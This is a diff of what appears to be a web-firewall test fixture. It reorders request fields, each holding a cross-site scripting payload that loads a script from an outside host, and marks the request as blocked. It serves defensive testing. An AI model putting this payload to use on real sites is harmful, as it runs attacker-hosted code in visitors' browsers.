@@ -1,11 +1,11 @@
 {
   "req": [
     {
-      "USER-AGENT": "<script src=//brutelogic.com.br/1.js>",
-      "BODY": "<script src=//brutelogic.com.br/1.js>",
-      "ARGS": "<script src=//brutelogic.com.br/1.js>",
-      "COOKIE": "<script src=//brutelogic.com.br/1.js>",
       "URL": "<script src=//brutelogic.com.br/1.js>",
+      "ARGS": "<script src=//brutelogic.com.br/1.js>",
+      "BODY": "<script src=//brutelogic.com.br/1.js>",
+      "COOKIE": "<script src=//brutelogic.com.br/1.js>",
+      "USER-AGENT": "<script src=//brutelogic.com.br/1.js>",
       "REFERER": "<script src=//brutelogic.com.br/1.js>",
       "HEADER": "<script src=//brutelogic.com.br/1.js>",
       "BLOCKED": true
